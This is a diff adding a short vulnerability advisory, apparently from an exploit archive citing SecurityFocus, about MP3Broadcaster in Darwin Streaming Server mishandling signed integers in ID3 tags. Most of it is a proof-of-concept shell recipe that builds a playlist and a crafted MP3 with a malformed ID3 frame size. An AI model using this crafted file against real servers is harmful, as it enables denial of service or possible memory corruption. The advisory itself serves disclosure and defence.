@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/7660/info
+
+MP3Broadcaster is shipped as part of Darwin Streaming Server software.
+
+MP3Broadcaster has been reported prone to a vulnerability when processing malicious ID3 tags. This is likely due to insufficient sanity checks performed when handling signed integer values contained within MP3 file ID3 tags.
+
+First create the sample configuration file:
+$ echo -e "\n" > test.conf
+
+Then create a playlist file:
+$ echo -e "*PLAY-LIST*\nsong.mp3" > mp3playlist.ply
+
+Create a specially crafted mp3 file:
+$ echo -e
+"ID3\x03\x00\x00\x00\x00\x0f\x0fTPE1\xff\xaa\xaa\xbb\x00\x00\x00\x00\x00\x00
+
+" > song.mp3 
